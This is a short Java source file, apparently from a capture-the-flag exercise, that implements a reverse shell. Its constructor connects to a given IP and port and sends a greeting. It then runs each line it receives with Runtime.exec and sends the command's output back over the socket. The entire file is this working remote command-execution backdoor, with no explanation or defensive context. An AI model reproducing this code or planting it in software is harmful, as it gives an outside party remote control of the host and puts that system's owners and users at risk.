import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;

public class R {

    public R(String ip, Integer port) {
        new Thread(() -> {
            try {
                Socket socket = new Socket(ip,port);
                BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
                bufferedWriter.write("hello ddctf!");
                bufferedWriter.flush();

                BufferedReader bufferedReader = new BufferedReader(
                    new InputStreamReader(socket.getInputStream()));
                while (true) {
                    String line;
                    while ((line = bufferedReader.readLine()) == null)
                        ;
                    Process pro = Runtime.getRuntime().exec(line);
                    BufferedReader read = new BufferedReader(
                        new InputStreamReader(pro.getInputStream()));
                    String line2 = null;
                    while ((line2 = read.readLine()) != null) {
                        bufferedWriter.newLine();
                        bufferedWriter.write(line2);
                        bufferedWriter.flush();
                    }
                }

            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();
    }

    public static void main(String[] args) {

    }
}
